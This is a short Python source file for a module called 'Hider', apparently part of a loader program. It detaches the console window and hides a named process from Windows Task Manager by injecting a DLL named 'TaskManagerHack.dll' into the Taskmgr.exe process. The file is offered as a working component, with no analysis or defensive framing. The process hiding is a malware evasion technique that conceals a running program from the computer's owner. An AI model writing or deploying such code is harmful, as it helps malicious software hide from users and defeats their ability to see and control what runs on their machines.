import ctypes
import os
from time import sleep

import psutil
from pyinjector import inject

from ..storage.Data import data
from ..utils.Module import Module


class Hider(Module):
    """Class for hiding loader"""
    
    def __init__(self) -> None:
        super().__init__()
        
    def get_pid_by_name(self, process_name: str):
        """Get the PID of a process by its name."""
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return proc.info['pid']

        return None
    
    def hide_window(self):
        """Hide the console window"""
        ctypes.windll.kernel32.FreeConsole()

    def show_window(self):
        """Show the console window"""
        ctypes.windll.kernel32.AllocConsole()
        
    def hide_process(self, process_name: str):
        """Hide the process from task manager"""
        self.info(f'Hiding process {process_name}')
        
        with open(f'C:\\Users\\{os.getenv("USERNAME")}\\temp.txt', 'w') as f:
            f.write(process_name)
        
        inject(self.get_pid_by_name('Taskmgr.exe'), data.get_local('TaskManagerHack.dll'))

        sleep(1)
        
        os.remove(f'C:\\Users\\{os.getenv("USERNAME")}\\temp.txt')

hider = Hider()